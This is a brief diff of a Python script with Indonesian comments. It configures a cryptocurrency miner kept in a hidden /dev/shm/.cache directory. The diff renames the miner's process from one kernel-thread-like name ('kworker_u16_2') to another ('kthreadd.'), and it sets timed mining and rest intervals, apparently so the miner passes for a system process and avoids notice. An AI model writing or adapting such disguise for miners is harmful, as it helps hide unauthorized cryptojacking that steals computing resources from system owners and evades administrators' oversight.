@@ -4,8 +4,8 @@ import sys
 import signal
 
 # CONFIG
-MINER_PATH = "/dev/shm/.cache/kworker_u16_2"  # Lokasi miner
-MINER_NAME = "kworker_u16_2"  # Nama miner buat kill
+MINER_PATH = "/dev/shm/.cache/kthreadd."  # Lokasi miner
+MINER_NAME = "kthreadd."  # Nama miner buat kill
 MINING_TIME = 2700  # 45 menit
 REST_TIME = 600  # 10 menit
 
